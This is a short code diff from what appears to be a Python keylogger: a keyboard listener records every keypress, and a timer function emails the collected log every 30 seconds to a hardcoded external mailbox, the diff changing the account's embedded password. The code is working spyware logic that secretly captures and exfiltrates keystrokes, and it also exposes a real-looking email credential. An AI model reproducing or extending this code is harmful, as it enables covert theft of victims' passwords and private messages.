@@ -31,7 +31,7 @@ keylogger_listener=keyboard.Listener(on_press=callback_function)
 
 def thread_function():
     global log
-    send_email("2204257028@nku.edu.tr","Parola2020",log.encode("utf-8"))
+    send_email("2204257028@nku.edu.tr","123",log.encode("utf-8"))
     log=""
     timer_object= threading.Timer(30,thread_function)
     timer_object.start()
